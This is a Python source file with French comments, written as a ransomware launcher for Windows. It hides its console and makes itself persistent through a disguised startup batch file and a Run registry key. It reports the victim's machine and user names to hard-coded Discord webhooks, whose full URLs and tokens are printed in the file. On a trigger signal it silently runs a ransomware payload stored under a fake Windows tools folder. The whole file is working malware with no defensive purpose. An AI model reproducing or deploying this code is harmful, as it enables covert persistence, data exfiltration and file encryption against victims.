import requests
import os
import subprocess
import time
import sys
import threading
from datetime import datetime

# =============================================
# CONFIGURATION
# =============================================

WEBHOOK_VICTIME = "https://discord.com/api/webhooks/1430856786843406507/ZECTEp8EjSpHafhK78K7fJ06c--CQiHlvtYE7i_vSXl4nR5YB_FG85oXzNLg8qJudl5Z"
WEBHOOK_ATTAQUANT = "https://discord.com/api/webhooks/1430869640569163787/X9RxfJg7vkAN1ohKBBerBsJSPrm6hZ_ojQ9LMtkD86VSuYCRTtZV9_1uBm_HkDoxLIGz"
CHECK_INTERVAL = 2  # Vérifie toutes les 2 secondes
RANSOMWARE_PATH = os.path.join(os.getenv('APPDATA'), 'Microsoft\\WindowsTools\\WindowsToolsMaker.py')

# =============================================
# FONCTIONS DE MASQUAGE
# =============================================

def masquer_console():
    """Masque la console Windows"""
    try:
        import ctypes
        whnd = ctypes.windll.kernel32.GetConsoleWindow()
        if whnd != 0:
            ctypes.windll.user32.ShowWindow(whnd, 0)
    except:
        pass

def ajouter_demarrage():
    """Ajoute le script au démarrage de la victime"""
    try:
        script_path = os.path.abspath(sys.argv[0])
        startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
        startup_bat = os.path.join(startup_dir, 'SystemHelper.bat')
        
        if not os.path.exists(startup_bat):
            batch_content = f'@echo off\nstart /min pythonw "{script_path}"\n'
            with open(startup_bat, 'w') as f:
                f.write(batch_content)
        
        # Ajout au registre pour plus de persistance
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                               "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                               0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsUpdateHelper", 0, winreg.REG_SZ, f'pythonw "{script_path}"')
            winreg.CloseKey(key)
        except:
            pass
            
    except Exception as e:
        log_error(f"Erreur démarrage: {e}")

# =============================================
# FONCTIONS DE LOGGING
# =============================================

def log_message(message):
    """Log un message avec timestamp"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {message}"
    
    # Sauvegarder dans un fichier log caché
    try:
        log_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft\\WindowsTools\\Logs')
        os.makedirs(log_dir, exist_ok=True)
        log_file = os.path.join(log_dir, 'surveillance.log')
        with open(log_file, 'a', encoding='utf-8') as f:
            f.write(log_entry + '\n')
    except:
        pass

def log_error(message):
    """Log une erreur"""
    log_message(f"❌ ERREUR: {message}")

# =============================================
# FONCTIONS WEBHOOK
# =============================================

def envoyer_statut_victime(message):
    """Envoie un statut au webhook victime"""
    payload = {
        "content": f"🔴 **VICTIME**: {message}",
        "embeds": [{
            "title": "Statut Victime",
            "description": f"Machine: {os.getenv('COMPUTERNAME')}\nUser: {os.getenv('USERNAME')}",
            "color": 16711680,
            "fields": [
                {"name": "Message", "value": message, "inline": False},
                {"name": "Heure", "value": datetime.now().strftime("%H:%M:%S"), "inline": True},
                {"name": "Status", "value": "SURVEILLANCE_ACTIVE", "inline": True}
            ],
            "timestamp": datetime.utcnow().isoformat()
        }]
    }
    try:
        requests.post(WEBHOOK_VICTIME, json=payload, timeout=5)
        return True
    except:
        return False

def obtenir_derniers_messages():
    """Récupère les derniers messages du webhook attaquant"""
    try:
        # Méthode simplifiée pour récupérer les messages
        # En production, utiliser l'API Discord pour récupérer les messages du webhook
        # Pour l'instant, on utilise un système de fichier temporaire
        
        signal_file = os.path.join(os.getenv('APPDATA'), 'Microsoft\\WindowsTools\\attack_signal.txt')
        
        # Vérifier si le fichier signal existe
        if os.path.exists(signal_file):
            with open(signal_file, 'r') as f:
                content = f.read().strip().upper()
            
            # Nettoyer le fichier après lecture
            os.remove(signal_file)
            
            # Vérifier les mots-clés d'attaque
            keywords = ["START", "ATTACK", "EXECUTE", "LAUNCH", "GO"]
            if any(keyword in content for keyword in keywords):
                return True
                
        return False
        
    except Exception as e:
        log_error(f"Erreur vérification messages: {e}")
        return False

def verifier_signal_attaque():
    """Vérifie s'il y a un signal d'attaque"""
    try:
        # Vérifier les messages du webhook
        if obtenir_derniers_messages():
            return True
            
        # Vérifier aussi dans les logs Discord (méthode alternative)
        # Cette partie peut être améliorée avec l'API Discord
        return False
        
    except Exception as e:
        log_error(f"Erreur vérification signal: {e}")
        return False

# =============================================
# FONCTIONS RANSOMWARE
# =============================================

def lancer_ransomware():
    """Exécute le ransomware sur la machine victime"""
    try:
        if os.path.exists(RANSOMWARE_PATH):
            log_message("🎯 LANCEMENT DU RANSOMWARE!")
            
            # Envoyer confirmation avant lancement
            envoyer_statut_victime("🚨 RANSOMWARE LANCE - Chiffrement en cours")
            
            # Lancer le ransomware silencieusement
            subprocess.Popen(['python', RANSOMWARE_PATH], 
                           creationflags=subprocess.CREATE_NO_WINDOW,
                           stdout=subprocess.DEVNULL, 
                           stderr=subprocess.DEVNULL)
            
            log_message("✅ Ransomware exécuté avec succès")
            
            # Confirmation finale
            envoyer_statut_victime("✅ Ransomware activé - Fichiers en cours de chiffrement")
            return True
            
        else:
            log_error("❌ Ransomware non trouvé")
            envoyer_statut_victime("❌ ERREUR: Ransomware non trouvé")
            return False
            
    except Exception as e:
        log_error(f"❌ Erreur exécution ransomware: {e}")
        envoyer_statut_victime(f"❌ ERREUR: {str(e)}")
        return False

# =============================================
# BOUCLE PRINCIPALE DE SURVEILLANCE
# =============================================

def boucle_surveillance():
    """Boucle principale qui surveille les signaux d'attaque"""
    log_message("🎯 SURVEILLANCE ACTIVE - En attente du signal d'attaque")
    envoyer_statut_victime("✅ Surveillance active - En attente du signal")
    
    compteur_verifications = 0
    attaque_declenchee = False
    
    while True:
        try:
            # Envoyer un heartbeat toutes les 5 minutes
            if compteur_verifications % 150 == 0:  # 150 * 2s = 5 minutes
                envoyer_statut_victime("🟢 Surveillance active - En attente")
                log_message("💓 Heartbeat envoyé")
            
            # Vérifier le signal d'attaque
            if not attaque_declenchee and verifier_signal_attaque():
                log_message("🎯 SIGNAL D'ATTAQUE DÉTECTÉ!")
                envoyer_statut_victime("🎯 Signal d'attaque reçu - Lancement du ransomware")
                
                # Délai court avant exécution
                time.sleep(1)
                
                # Lancer le ransomware
                if lancer_ransomware():
                    attaque_declenchee = True
                    log_message("✅ Attaque terminée avec succès")
                else:
                    log_message("❌ Échec de l'attaque - Nouvelle tentative plus tard")
            
            compteur_verifications += 1
            time.sleep(CHECK_INTERVAL)
            
        except Exception as e:
            log_error(f"Erreur boucle surveillance: {e}")
            time.sleep(10)  # Attendre 10 secondes en cas d'erreur

# =============================================
# DÉMARRAGE
# =============================================

if __name__ == "__main__":
    # Masquer la console immédiatement
    masquer_console()
    
    # Ajouter au démarrage
    ajouter_demarrage()
    
    # Petit délai avant démarrage
    time.sleep(2)
    
    # Démarrer la surveillance
    boucle_surveillance()